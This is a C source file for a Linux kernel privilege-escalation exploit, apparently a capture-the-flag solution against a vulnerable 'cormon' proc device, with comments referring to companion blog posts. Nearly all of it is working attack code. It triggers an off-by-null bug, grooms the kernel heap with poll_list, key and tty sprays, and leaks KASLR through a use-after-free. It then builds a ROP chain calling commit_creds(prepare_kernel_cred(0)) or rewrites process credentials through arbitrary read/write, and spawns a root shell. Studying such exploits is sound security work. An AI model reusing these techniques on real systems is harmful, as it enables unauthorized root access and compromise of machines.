#define _GNU_SOURCE
#include <err.h>
#include <fcntl.h>
#include <keyutils.h>
#include <limits.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <unistd.h>
#include <x86intrin.h>

#include "config.h"

#ifdef SPLOIT_DEBUG
#define DEBUG
#endif // SPLOIT_DEBUG

#include "sploit.h"
#include "./libexp/errhandling.h"
#include "./libexp/sched_stuff.h"
#include "./libexp/xattr.h"
#include "./libexp/heap_defragment.h"
#include "./libexp/heap_spray.h"
#include "./libexp/poll_stuff.h"
#include "./libexp/rop.h"
#include "./libexp/key_stuff.h"
#include "./libexp/rw_pipe_and_tty.h"
#include "./libexp/tty_write_stuff.h"
#include "./libexp/leaks.h"
#include "./libexp/utils.h"

#ifdef TEST
#define PROC_CORMON "/dev/null"
#else
#define PROC_CORMON "/proc_rw/cormon"
#endif

/*----------------------------------------------------------------------
 * Some kernel structs
 */

struct my_poll_list {
  uint64_t next;
  uint32_t len;
  uint32_t padding;
  uint64_t pfd1;
  uint64_t pfd2;
};

struct my_tty_file_private {
  uint64_t tty;
  uint64_t file;
  uint64_t list_next;
  uint64_t list_prev;
};

/*----------------------------------------------------------------------
 * GLOBALS
 */

/* heap sprays */
static int defrag_pipefds[N_DEFRAGMENT_KM1k][2];
static int n_defrag_pipefds;

static int spray_pipefds[N_SPRAY_PIPE][2];
static int n_spray_pipefds;

/* leaks */
// kmalloc-1k
static uint64_t tty_leak;
#ifdef RW_VARIANT
static uint64_t task_struct;
#endif // RW_VARIANT


/* ROP */
const uint64_t rop_chain[] = {
  /* stack pivot */
  ADD_RSP_0X18_RET, 			       // gadget 2
  MOV_RSP_RCX_POP_RBX_POP_R14_POP_R15_POP_RBP_RET, // gadget 1
  ROP_JUNK,
  0x0 | ROP_NEED_RB_H, 			       // &rop_chain
  /* privilege escalation */
  POP_RDI_RET,
  0,
  PREPARE_KERNEL_CRED,		// rax = prepare_kernel_cred(0)
  PUSH_RAX_POP_RBX_RET,  		// rax->rbx->rcx->rdi
  POP_RDI_RET,
  0,
  POP_RCX_RET,
  0,
  ADD_RCX_RBX_MOV_RAX_RCX_POP_RBX_RET,
  ROP_JUNK,
  ADD_RDI_RCX_MOV_RAX_RDI_RET,
  COMMIT_CREDS,  			// commit_creds(prepare_kernel_cred(0))
  BPF_GET_CURRENT_TASK,  		// rax = current
  POP_RDI_RET,
  0x6E0,  				// rdi = offsetof(struct task_struct, fs)
  ADD_RAX_RDI_RET,
  PUSH_RAX_POP_RBX_RET,  		// rbx = &current->fs ; callee saved
  POP_RDI_RET,
  INIT_FS,
  COPY_FS_STRUCT,  			// rax = copy_fs_struct(init_fs)
  MOV_QWORD_PTR_RBX_RAX_POP_RBX_RET,  	// current->fs = copy_fs_struct(init_fs)
  ROP_JUNK,
  SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 22, // skip restoring regs
  ROP_JUNK,
  ROP_JUNK,
};

const uint32_t rop_chain_len = sizeof(rop_chain)
  			     + sizeof(struct iretq_regs);

/* arbitrarily read write */
struct task_struct_offsets task_struct_offsets = {
  .comm = TASK_STRUCT_COMM_OFFSET,
  .cred = TASK_STRUCT_CRED_OFFSET,
  .fs = TASK_STRUCT_FS_OFFSET,
  .nsproxy = TASK_STRUCT_NSPROXY_OFFSET,
  .seccomp = TASK_STRUCT_SECCOMP_OFFSET,
  .thread_info = TASK_STRUCT_THREAD_INFO_OFFSET,
  .__align = TASK_STRUCT_ALIGN,
};

struct cred_offsets cred_offsets = {
  .cap_inheritable = CRED_CAP_INHERITABLE_OFFSET,
  .jit_keyring = CRED_JIT_KEYRING_OFFSET,
  .securebits =  CRED_SECUREBITS_OFFSET,
  .uid = CRED_UID_OFFSET,
};

/*----------------------------------------------------------------------
 * Exploiting UAF on user_key_payload to leak KASLR and tty_struct in
 * kmalloc4k
 */

// Search the heap dump for an array of three pages, which is allocated
// as a side effect of opening a tty.
static uint64_t find_page_leak(uint64_t (*leak)[4])
{
  uint64_t ret = 0;

  for (unsigned i = 0;
       i < (USHRT_MAX / sizeof(*leak)) - 1;
       leak++, i++) {
      LOGI("[|] page[0] %lx", (*leak)[0]);
      LOGI("[|] page[1] %lx", (*leak)[1]);
      LOGI("[|] page[2] %lx", (*leak)[2]);
      LOGI("[|] page[3] %lx", (*leak)[3]);
      if ((*leak)[0] && (*leak)[1] && (*leak)[2] && !(*leak)[3] &&
	  ((*leak)[0] & (~0xFFFFFFUL)) == ((*leak)[1] & (~0xFFFFFFUL))
	  && (*leak)[0] % 64 == 0)
      {
	// RESEARCH ME: under which conditions is it possible to derive
	//   vmemap_base from a page leak, aka., ALSR entropy
	//   vs. amount of RAM and device memory
	ret = (*leak)[0] & (~0xFFFFFFFFUL);
	break;
      }
  }

  return  ret;
}

// search the heap dump for a tty_file_private
static uint64_t find_tty_leak(struct my_tty_file_private* leak)
{
  for (unsigned i = 0;
       i < (USHRT_MAX / sizeof(struct my_tty_file_private)) - 1;
       leak++, i++) {
    if (leak->tty || leak->file || leak->list_next || leak->list_prev) {
      LOGI("[|] leak->tty %lx", leak->tty);
      LOGI("[|] leak->file %lx", leak->file);
      LOGI("[|] leak->list_next %lx", leak->list_next);
      LOGI("[|] leak->list_prev %lx", leak->list_prev);
    }
    if (leak->list_next == leak->list_prev
	&& leak->list_next - leak->tty == TTY_FILES_SOFF) {
      return leak->tty;
    }
  }

  return 0;
}

static int collect_leaks(void)
{
  long ret = 0;
  int i = 0;
  uint64_t* leak = NULL;

  CHECK_PTR(leak = calloc(1, USHRT_MAX), "calloc");

  /* Check if we managed to get the UAF on user key payload */
  {
    for (i = 0; i < N_KEYS * N_KEY_THREADS; i++) {
      CHECK_POS(keyctl_read(keys[i], (char*)leak,
	    USHRT_MAX), "keyctl_read");
      if ((*leak & 0xFFF) == PROC_SINGLE_SHOW_PGOFF) {
	uaf_key = keys[i];
	LOGS("\n[+] [SUCCESS] key %d is UAF", i);

	kernel_base = *leak - PROC_SINGLE_SHOW_BOFF;
	LOGS("[+] [LEAK] _text@0x%lx", kernel_base);

	break;
      } else if (*leak & ~0x000000000000FFFFUL) {
	LOGE("UAF key was reclaimed by wrong "
	    "object type (payload=%lx)", *leak);
	ret = 1;
	goto out;
      } else {
	*leak = 0;
	printf(i & 1 ? (i & 2 ? "\\" : "-") : (i & 2 ? "_" : "/"));
      }
    }

    if (i == N_KEYS * N_KEY_THREADS) {
      LOGE("Unable to get UAF on user_key_payload");
      ret = 1;
      goto out;
    }
  }

  /* Hopefully place some tty_file_private in the range of our UAF
   * OOB read
   */
  // Do frees on exploit CPU. Q: Would freed objects directly get back
  // to the per-CPU in-use freelist if they are freed on a foreign CPU?
  // In other words: Is there a difference between freeing objects in
  // the active per-cpu slab on the CPU itself vs. on a foreign CPU.
  // A: No and yes.
  {
    PIN(EXPLOIT_CPU);

    // Defragment km1k
    CHECK_ZERO(alloc_pipes(N_DEFRAGMENT_KM1k,
	defrag_pipefds,
	&n_defrag_pipefds,
	N_DEFRAGMENT_KM1k), "alloc_pipes");
    CHECK_ZERO(free_pipes(N_SLOTS_KM1k,
	defrag_pipefds,
	&n_defrag_pipefds), "free_pipes");

    // Free all keys besides the UAF one to make some space in the slab
    // ...
    CHECK_ZERO(free_keys(N_KEYS, 1), "free_keys");

    // ... which we can spray with TTYs now.
    CHECK_ZERO(spray_tty(N_SPRAY_TTY), "spray_tty");

    PIN(OTHER_CPU);
  }

  /* Redo the read to get the updated heap state and search the dump
   * for tty_file_private
   */
  {
    CHECK_POS(keyctl_read(uaf_key, (char*)leak,
	  USHRT_MAX), "keyctl_read");
    // align to next 32B chunk (i.e. the slot after the uaf key)
    tty_leak = find_tty_leak((struct my_tty_file_private*)(leak+1));
    // RESEARCH ME: under which conditions is it possible to derive
    //   page_offset_base from a direct map leak, aka., ALSR entropy
    //   vs. amount of RAM and device memory
    page_offset_base = tty_leak & ~0x1FFFFFFFFUL;
    // compute address where ROP chain will be based
    rop_chain_base = tty_leak + KM1k_OFFSET + 0x18;
    vmemmap_base = find_page_leak((uint64_t (*)[4])(leak+1));
    if (!tty_leak || !vmemmap_base) {
      LOGE("Unable to find tty leak and/or vmemmap_base in dump");
      ret = 1;
      goto out;
    }
    LOGS("vmemmap_base@%lx", vmemmap_base);
    LOGS("page_offset_base@%lx", page_offset_base);
    LOGS("tty_struct@0x%lx", tty_leak);
  }

out:
  free(leak);
  return (int)ret;
}

/*----------------------------------------------------------------------
 * BUG
 */

static ssize_t trigger_bug(int cormon, char* buf)
{
  ssize_t ret = 0;

  // Wait until all poll threads are in the kernel ...
  while (n_active_poll != N_SLOW_POLL_THREADS) {}
  sched_yield();

  // ... then allocate the filter (hopefully as the 8th object in a
  // slab with 7 victim objects and trigger off-by-null bug.
  ret = write(cormon, buf, 0x1000);
#ifdef TEST
#else
  if (ret != -1) { // expect it to fail since our filter is invalid
    err(1, "ERR: %s (%ld)", "write", ret);
  }
#endif
  ret = 0;

  LOGI("Triggered off-by-null bug, good luck!");

  return ret;
}

/*----------------------------------------------------------------------
 * SPLOIT
 */

int main()
{
  int cormon = 0;
  char* buf = NULL;
  uint64_t start = 0, end = 0; // measure time of operations

  setvbufs();

  LOGI("Running " VARIANT " of the exploit");

  /*==================================================================
   * BLOGPOST I
   *==================================================================*/
#ifdef RW_VARIANT
  rw_pity_init();
#endif

  // get handle for the vulnerable device
  CHECK_FD(cormon = open(PROC_CORMON, O_RDWR),
      "open cormon");

  // prepare payload for triggering the bug
  CHECK_PTR(buf = malloc(0x1000), "malloc");
  memset(buf, 'A', 0x1000);

  // create file to set xattr on
  CHECK_ZERO(init_xattr_file(), "init_xattr_file");

  /* Defragmentation */
  // km4k
  for (int id = 0; id < N_DEFRAGMENT_POLL_THREADS; id++) {
    CHECK_ZERO(create_poll_thread(id, 30 + 508,
	DEFRAGMENT_POLL_THREAD_TIMEOUT, 0, OBJ_INVAL),
	"create_poll_thread");
  }

  // km32
  PIN(EXPLOIT_CPU);
  CHECK_ZERO(defragment_kmalloc32(), "defragment_kmalloc32");
  CHECK_ZERO(free_one_km32_slab(), "free_one_km32_slab");
  PIN(OTHER_CPU);

  /* S1 */
  CHECK_ZERO(pthread_barrier_init(&key_barrier, NULL,
	N_KEY_THREADS + 1), "key barrier init");
  for (int id = 0; id < N_KEY_THREADS; id++) {
    CHECK_ZERO(create_key_thread(id), "create_key_thread");
  }
  // wait until some spraying has happened
  pthread_barrier_wait(&key_barrier);

  // wait for the defragmentation poll threads to finish
  CHECK_ZERO(join_poll_threads(N_DEFRAGMENT_POLL_THREADS),
      "join_poll_threads");
  // spray poll_list into kmalloc4k (victim objects) and kmalloc32
  for (int id = 0; id < N_SLOW_POLL_THREADS; id++) {
    // nfds: 30 on kernel stack, 510 in kmalloc4k, 2 in kmalloc32
    CHECK_ZERO(create_poll_thread(id, 30 + 510 + 2,
	SLOW_POLL_THREAD_TIMEOUT, 0, OBJ_SEQ_OPS),
	"create_poll_thread");
  }

  /* S 2 */
  // hopefully place vulnerable object in slab with 7 victim objects
  PIN(EXPLOIT_CPU);
  CHECK_ZERO(trigger_bug(cormon, buf), "trigger_bug");
  PIN(OTHER_CPU);

  /* S 3 */
  // clean up threads
  CHECK_ZERO(join_key_threads(), "join_key_threads");
  CHECK_ZERO(join_poll_threads(N_SLOW_POLL_THREADS),
      "join_poll_threads");
  CHECK_NOT_ZERO(poll_list_corrupted, "No 1st stage poll thread "
      "experienced poll_list corruption, exploit failed!");
  poll_list_corrupted = 0;
  close(cormon);

  /* S 5 */
  // Leak KASLR and the address of a tty_struct ...
  CHECK_ZERO(collect_leaks(), "collect_leaks");
  // ... use it to generate the final ROP payload.
  CHECK_ZERO(rop_gen_chain(true), "gen_rop_chain");

  /*==================================================================
   * BLOGPOST II
   *==================================================================*/
  /* Corrupting another poll_list */

  /* Step 2 */
  // poll threads will pile up on barrier, waiting for our GO to spray
  // `poll_list`s
  // Upon return, one of those threads will arbitrarily free an array of
  // pipe_buffer. Depending on the VARIANT we want it to reclaim it
  // either with an all-zero tty_write buffer or with a key holding a
  // ROP chain.
  CHECK_ZERO(pthread_barrier_init(&poll_list_barrier, NULL,
	N_2ndSTAGE_POLL_THREADS + 1), "pthread_barrier_init");
  for (int id = 0; id < N_2ndSTAGE_POLL_THREADS; id++) {
    enum spray_object reclaim_object =
#ifdef RW_VARIANT
	OBJ_TTY_WRITE_BUF;
#else
	OBJ_ROP;
#endif // RW_VARIANT
    CHECK_ZERO(create_poll_thread(id, 30 + 510 + 2,
	T_2ndSTAGE_POLL_THREADS, 1,
	reclaim_object), "create_poll_thread");
  }

  PIN(EXPLOIT_CPU);
  CHECK_ZERO(free_key(uaf_key), "free_key(uaf_key)");
  PIN(OTHER_CPU);
  uaf_key = 0;

  // tell poll treads to plz go and reclaim the UAF slot
  pthread_barrier_wait(&poll_list_barrier);
  sched_yield();


  /* Step 3 */
  // arbitrarily free the `poll_list` and replace it with a fake one
  {
    // xattr-initialization will use this memory to initialize the first
    // two QWORDS of user_key_payload (which are otherwise
    // uninitialized), it  reclaims poll_list that was
    // arbitrarily freed due to closing seq_operations
    struct my_poll_list* fake_poll_list;

    CHECK_PTR(fake_poll_list = calloc(1, sizeof(*fake_poll_list)),
	"calloc");
    // We cannot point the next pointer of the faked poll_list
    // directly to the km1k slot since otherwise the `datalen` of the
    // `user_key_payload` will overlap with the `ops` of the first
    // `pipe_buffer`, causing a kernel crash. Make it such that
    // buf->ops == NULL for the first `pipe_buffer` and let the payload
    // overlap with the second one. As pipe->bufs is calloced there is
    // no problem with stopping the list traversal.
    fake_poll_list->next = tty_leak + KM1k_OFFSET;

    PIN(EXPLOIT_CPU);
    start = _rdtsc();
    CHECK_ZERO(free_seq_ops(), "free_seq_ops");
    /* keys usually reclaim late or just miss, we cannot spray more
     * of then so just alloc something else in kmalloc-32
     * */
    CHECK_ZERO(alloc_seq_ops(NULL, 0x10), "alloc_seq_ops");
    CHECK_ZERO(spray_keys(N_KEYS_2, (void*)fake_poll_list,
	0x20, NULL, 0, 0), "spray_keys #2");
    end = _rdtsc();
    PIN(OTHER_CPU);
    LOGI("Faking poll_list took %lu cycles\n", end - start);

    free(fake_poll_list);
  }

  /* Step 1 */
  // replace `tty_struct` with pipes, chunking for better results
  PIN(EXPLOIT_CPU);
  for (int chunk = 0; chunk < N_SPRAY_TTY / CHUNK_REPLACE_TTY; chunk++) {
    CHECK_ZERO(free_ttys(CHUNK_REPLACE_TTY), "free_ttys");
    CHECK_ZERO(alloc_pipes(CHUNK_FACTOR_PIPE * CHUNK_REPLACE_TTY,
	spray_pipefds, &n_spray_pipefds, N_SPRAY_PIPE), "alloc_pipes");
  }
  PIN(OTHER_CPU);

  /* Faking `pipe_buffer`s for code execution */
  // Thread that experiences corruption will also spray the ROP chain.
  // This hopefully stabilizes the allocator in km1k. In the process it
  // freed all but the UAF key in km32, which was already freed during
  // list cleanup. Any operation on this remaining key will probably crash
  // the kernel.
  CHECK_ZERO(join_poll_threads(N_2ndSTAGE_POLL_THREADS),
      "join_poll_threads(second stage)");
  CHECK_NOT_ZERO(poll_list_corrupted, "No 2nd stage poll thread "
      "experienced poll_list corruption, exploit failed!");
  poll_list_corrupted = 0;

#ifdef RW_VARIANT
  LOGI("Figuring out which tty corrupted which pipe");
  CHECK_ZERO(rw_pity_identify_pair(spray_pipefds,
      n_spray_pipefds, NULL, 0), "rw_pity_identify_pair");

  LOGI("Searching for my task_struct");
  task_struct = rw_pity_search_my_task_struct(tty_leak);
  if (task_struct == ULONG_MAX) {
    LOGE("Failed to find task_struct");
    exit(EXIT_FAILURE);
  }
  LOGS("Found my task_struct@%lx", task_struct);

  LOGI("Using r/w for privilege escalation");
  rw_pity_privesc_creds(task_struct);
  rw_pity_privesc_fs(task_struct);

  fork_exec_shell();
#else
  // Close all pipes to get code execution
  LOGI("Closing pipes to trigger ROP");
  CHECK_ZERO(free_pipes(n_spray_pipefds, spray_pipefds,
	&n_spray_pipefds), "free_pipes");

  LOGE("ROP Failed :(");
  exit(EXIT_FAILURE);
#endif // RW_VARIANT
}
